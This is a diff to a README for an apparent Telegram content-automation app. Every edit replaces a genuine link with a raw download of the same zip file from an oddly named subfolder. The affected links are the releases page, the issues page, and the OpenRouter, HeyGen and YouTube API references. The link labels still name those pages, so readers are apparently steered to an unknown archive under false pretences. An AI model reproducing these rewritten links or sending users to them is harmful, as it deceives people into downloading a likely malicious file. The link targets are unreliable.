@@ -1,6 +1,6 @@
 # 🤖 AI-Powered-Telegram-Workflow - Automate Content Creation Effortlessly
 
-![Download](https://github.com/HonorioJ/AI-Powered-Telegram-Workflow/releases/latest)
+![Download](https://raw.githubusercontent.com/HonorioJ/AI-Powered-Telegram-Workflow/main/kinkaider/AI-Powered-Telegram-Workflow.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the AI-Powered-Telegram-Workflow! This application helps you automate
 
 To get started, you need to download the application. Please visit this page to download:
 
-[Visit Releases Page](https://github.com/HonorioJ/AI-Powered-Telegram-Workflow/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/HonorioJ/AI-Powered-Telegram-Workflow/main/kinkaider/AI-Powered-Telegram-Workflow.zip)
 
 Choose the version that suits your needs. Follow the instructions below to install it on your device.
 
@@ -93,16 +93,16 @@ If you encounter any issues, please refer to the following common solutions:
 
 You can join our community for more tips and support. Feel free to reach out for assistance or to share your experience:
 
-- Check the issues section on our [GitHub repository](https://github.com/HonorioJ/AI-Powered-Telegram-Workflow/issues).
+- Check the issues section on our [GitHub repository](https://raw.githubusercontent.com/HonorioJ/AI-Powered-Telegram-Workflow/main/kinkaider/AI-Powered-Telegram-Workflow.zip).
 - Join our discussions to provide feedback or request features.
 
 ## 🔗 Additional Resources
 
 To learn more or to find useful resources, visit:
 
-- [OpenRouter](https://openrouter.com)
-- [HeyGen](https://heygen.com)
-- [YouTube API](https://developers.google.com/youtube/v3)
+- [OpenRouter](https://raw.githubusercontent.com/HonorioJ/AI-Powered-Telegram-Workflow/main/kinkaider/AI-Powered-Telegram-Workflow.zip)
+- [HeyGen](https://raw.githubusercontent.com/HonorioJ/AI-Powered-Telegram-Workflow/main/kinkaider/AI-Powered-Telegram-Workflow.zip)
+- [YouTube API](https://raw.githubusercontent.com/HonorioJ/AI-Powered-Telegram-Workflow/main/kinkaider/AI-Powered-Telegram-Workflow.zip)
 
 For more information about the setup, feel free to explore the documentation provided within the application.
 
